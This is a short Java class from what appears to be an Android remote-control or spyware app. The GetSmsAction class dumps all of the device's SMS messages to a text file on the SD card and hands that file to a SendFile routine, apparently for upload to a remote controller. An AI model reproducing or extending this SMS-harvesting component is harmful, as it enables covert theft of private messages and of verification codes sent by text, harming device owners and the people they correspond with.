package com.lfish.control.action.actiondomian;

import com.lfish.control.ControlApplication;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.actiontool.CmdUtils;
import com.lfish.control.action.actiontool.SMS;
import com.lfish.control.action.actiontool.Utils;

import java.io.File;

public class GetSmsAction extends BaseBeanAction {

	@Override
	public void run() {
		// TODO Auto-generated method stub
		SMS smsManager = new SMS(ControlApplication.context);
		if(smsManager!=null)
		{
			String FileName = CmdUtils.GetFileName(ControlApplication.context, getActionId(), "txt");
			String path = Utils.SDPATH + Utils.DIR + File.separator+FileName;
			smsManager.savetoPath(path);

			File file = new File(path);
			if(file.exists())
			{
				SendFile(path);
			}else{
				sendTxt("没有短信记录");
			}
		}
	}
}
